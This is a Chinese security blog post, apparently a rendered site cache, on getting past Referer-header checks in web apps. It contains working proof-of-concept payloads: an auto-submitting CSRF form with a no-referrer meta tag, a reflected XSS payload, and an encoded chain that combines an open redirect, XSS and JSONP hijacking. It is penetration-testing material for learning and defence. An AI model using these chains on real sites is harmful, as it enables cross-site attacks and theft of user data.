@@ -1,0 +1,231 @@
+I"�/<h1 id="前言">前言</h1>
+
+<p>在做测试的时候会遇见这样几个漏洞场景：</p>
+
+<ol>
+  <li>JSONP跨域劫持</li>
+  <li>反射XSS</li>
+  <li>GET请求类型攻击</li>
+</ol>
+
+<p>但是，在相对安全的情况下，都会有Referer(HTTP请求头)的限制。那么该如何去做绕过呢？</p>
+
+<h1 id="正文">正文</h1>
+
+<h2 id="什么是referer">什么是Referer？</h2>
+
+<p>Referer是请求头的一部分，假设A站上有B站的链接，在A站上点击B站的链接，请求头会带有Referer，而Referer的值为A站的链接；这也就是为什么上文所说的场景，遇见了Referer的限制就可能GG了。</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x00.png" alt="0" /></p>
+
+<h2 id="绕过之道">绕过之道</h2>
+
+<h3 id="常规绕过">常规绕过</h3>
+
+<p>一个实际场景：</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x01.png" alt="referer" /></p>
+
+<p>先来说说一些常规化的东西：</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">子域名方式</code></li>
+</ul>
+
+<p>使用子域名的方式进行绕过：</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x02.png" alt="subdomain" /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">域名前增加</code></li>
+</ul>
+
+<p>在域名前面增加随机的a-z和0-9也可以进绕过：</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x03.png" alt="rand" /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">？号</code></li>
+</ul>
+
+<p>将域名作为GET请求参数进行绕过：</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x04.png" alt="subdomain" /></p>
+
+<h3 id="打破常规">打破常规</h3>
+
+<h4 id="无referer">无Referer</h4>
+
+<p>之前在做测试的时候，将Referer头删除也可以绕过，但是在真正的利用中能不能去实现呢？是可以的。</p>
+
+<p>在HTML标签中有这样一个标签<code class="language-plaintext highlighter-rouge">&lt;meta&gt;</code>，而这个标签是表示无Referer，就是如下的代码：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"never"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>我原来的PoC为：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://127.0.0.1/test.php"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+    <span class="nt">&lt;script&gt;</span>
+      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+    <span class="nt">&lt;/script&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>修改之后的PoC为：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"never"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://127.0.0.1/test.php"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+    <span class="nt">&lt;script&gt;</span>
+      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+    <span class="nt">&lt;/script&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x05.png" alt="null referer" /></p>
+
+<h4 id="与其他资源组合">与其他资源组合</h4>
+
+<h5 id="超链接">超链接</h5>
+
+<p>在上文就提到了A站有B站的链接，在A站点击B站的链接，Referer就为A站的链接了。那么在这里我能否使用白名单域下的业务做超链接，链接地址为A站存在问题的链接再搭配一个点击劫持或者诱导的方式进行组合攻击？</p>
+
+<p><em>例如gh0st.cn做了Referer的限制：</em></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Referer</th>
+      <th>State</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>http://gh0st.cn (Current Domain)</td>
+      <td>YES</td>
+    </tr>
+    <tr>
+      <td>http://www.hi-ourlife.cn (Other Domain)</td>
+      <td>NO</td>
+    </tr>
+    <tr>
+      <td>http://a.gh0st.cn (SubDomain)</td>
+      <td>YES</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>实际场景：</strong></p>
+
+<ul>
+  <li>公开信息对外</li>
+</ul>
+
+<p>在个人中心处可以编辑个人的微博地址：</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x06.png" alt="weibo" /></p>
+
+<p>微博地址是对外的公开信息：</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x07.png" alt="weibo" /></p>
+
+<p>那么结合一下点击劫持或者用户常规的点击了～那就GGGGGGG了～</p>
+
+<ul>
+  <li>论坛</li>
+</ul>
+
+<p>现在很多厂商都有自己的开放论坛，特别是Discuz这种很多，而Discuz回复是可以使用超链接的：</p>
+
+<p>回复这样的格式：<code class="language-plaintext highlighter-rouge">[url=u]t[/url]</code> u部分为地址，t部分为地址名字～</p>
+
+<h5 id="url跳转">URL跳转</h5>
+
+<p>302跳转是否可以？NO，不可以。</p>
+
+<p>这里的URL跳转是JavaScript的URL跳转。</p>
+
+<p>常见的两个：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h6 id="反射xssreferer限制">反射XSS(Referer限制)</h6>
+
+<ol>
+  <li>这里我已经有一个存在任意URL跳转漏洞了：</li>
+</ol>
+
+<p><code class="language-plaintext highlighter-rouge">http://test.vulkey.cn/link.php?url=http://www.hi-ourlife.com</code></p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x08.png" alt="js" /></p>
+
+<ol>
+  <li>我有一个反射XSS漏洞：</li>
+</ol>
+
+<p><code class="language-plaintext highlighter-rouge">http://vulkey.cn/jsonp.php?callback=vulkey</code></p>
+
+<p>当 <code class="language-plaintext highlighter-rouge">referer = a.com</code> :</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x09.png" alt="xss" /></p>
+
+<p>当 <code class="language-plaintext highlighter-rouge">referer = vulkey.cn</code> :</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x10.png" alt="xss" /></p>
+
+<p>当 <code class="language-plaintext highlighter-rouge">referer = *.vulkey.cn</code> :</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x11.png" alt="xss" /></p>
+
+<p>这个接口验证了Referer使用之前的方法没办法绕过，于是采用组合拳搭配。</p>
+
+<p>于是有了如下的构建：<code class="language-plaintext highlighter-rouge">http://test.vulkey.cn/link.php?url=http://vulkey.cn/jsonp.php?callback=vulkey&lt;svg/onload=alert(1)&gt;</code></p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x12.png" alt="xss" /></p>
+
+<h6 id="jsonp劫持反射xssurl跳转">JSONP劫持+反射XSS+URL跳转</h6>
+
+<p>这个案例是基于上面反射XSS案例的，现在已知的三个问题：</p>
+
+<ol>
+  <li>JSONP接口 <code class="language-plaintext highlighter-rouge">http://vulkey.cn/jsonp.php?callback=vulkey</code> <strong>有Referer限制</strong></li>
+  <li>反射XSS <code class="language-plaintext highlighter-rouge">http://vulkey.cn/jsonp.php?callback=vulkey&lt;svg/onload=alert(1)&gt;</code> <strong>有Referer限制</strong></li>
+  <li>JavaScript URL跳转 <code class="language-plaintext highlighter-rouge">http://test.vulkey.cn/link.php?url=http://www.hi-ourlife.com</code></li>
+</ol>
+
+<p>一般JSONP跨域劫持的PoC是这样的：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="kd">function</span> <span class="nx">jsonp2</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span><span class="nx">alert</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">));}</span><span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"url"</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>但是因为有Referer限制，就不能在自己的站点上做PoC了，就只能利用反射XSS漏洞构建PoC：</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://vulkey.cn/jsonp.php?callback=%3Cscript%3Efunction+vulkey(data){alert(JSON.stringify(data));}%3C/script%3E%3Cscript+src=%22http://vulkey.cn/jsonp.php?callback=vulkey%22%3E%3C/script%3E</code></p>
+
+<p>但仅仅如此是不够是因为XSS有Referer来源的限制，所以最终的PoC应该是这样的：</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://test.vulkey.cn/link.php?url=http://vulkey.cn/jsonp.php?callback=%253Cscript%253Efunction%2bvulkey%28data%29%7Balert%28JSON.stringify%28data%29%29%3B%7D%253C%2fscript%253E%253Cscript%2bsrc%3D%2522http%3A%2f%2fvulkey.cn%2fjsonp.php%3Fcallback%3Dvulkey%2522%253E%253C%2fscript%253E</code></p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x13.png" alt="bypass" /></p>
+
+<p>也就是说在这里JS的URL跳转解决了XSS的Referer限制问题，而XSS又解决了JSONP接口的Referer限制问题，这是一个联合组合拳。如果你发现的XSS没有Referer限制则不需要这么”麻烦”。</p>
+
+<h1 id="结尾">结尾</h1>
+
+<p>文中总结一些小的TIPS，针对我遇到的实际案例进行了漏洞的复现截图，打开思维其实还有更多更好的思路，有机会后期会写出来。</p>
+:ET
